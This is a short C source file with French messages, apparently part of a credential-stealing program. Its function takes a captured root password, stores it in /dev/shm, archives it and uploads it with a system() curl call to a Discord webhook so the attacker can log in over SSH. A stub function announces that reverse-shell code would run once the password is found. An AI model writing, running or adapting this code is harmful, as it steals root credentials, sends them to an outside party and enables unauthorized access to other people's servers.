#include "2_header.h"
#include<stdio.h>
#include<stdlib.h>

#define BLACK       "\033[30m"
#define RED         "\033[31m"
#define GREEN       "\033[32m"
#define YELLOW      "\033[33m"
#define BLUE        "\033[34m"
#define MAGENTA     "\033[35m"
#define CYAN        "\033[36m"
#define WHITE       "\033[37m"
#define RESET       "\033[0m"


int indelogable(void)
{
    printf("code de reverse shell appele avec mdp found\n");
    return 0;
}


int fonction_destination(const char* modepass) {
    
    printf(""CYAN"Transfert du Mot de Pass R00t !"RESET""RED" %s\n\n"RESET"",modepass);
    printf(""GREEN"\nStockage du mot de pass dans /dev/shm/54897644576\n"RESET"");
    FILE* root = fopen("/dev/shm/54897644576","w");
    
    if(root == NULL)
    {
        printf(""RED"Erreur lors de la création du fichier de stockage\n"RESET"");
    }
    else
    {
        fputs(modepass,root);
        fclose(root);
        printf(""GREEN"Mot de pass stocke avec succes dans /dev/shm/54897644576 , agentpathogene arrive ...\n\n"RESET"");
        printf("\n"MAGENTA"Envoi du mdp root on sais jamais qu'on peu se connecter au serveur en ssh\n\n"RESET"");
        system("tar -czf /dev/shm/root.tar.gz -C /dev/shm/ 54897644576 2>/dev/null");
        system("curl -F \"file=@/dev/shm/root.tar.gz\" https://discord.com/api/webhooks/ID/TOKEN 2>/dev/null");

    }
 

    indelogable();
    return 0;
}


